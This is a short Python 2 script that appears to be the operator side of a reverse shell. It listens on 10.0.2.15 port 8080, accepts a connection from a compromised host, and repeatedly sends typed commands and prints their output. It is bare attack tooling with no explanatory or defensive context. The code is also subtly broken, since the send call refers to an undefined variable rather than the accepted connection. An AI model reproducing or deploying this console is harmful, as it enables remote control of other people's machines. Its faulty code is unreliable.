import socket

create_a_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
create_a_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
create_a_listener.bind(("10.0.2.15", 8080))
create_a_listener.listen(0)
print("listening . . .")
(connections, create_a_address) = create_a_listener.accept()
print("connected : " + str(create_a_address))

while True:
	command = raw_input("command : ")
	create_a_connection.send(command)
	command_outputs = connections.recv(1024)
	print(command_outputs)
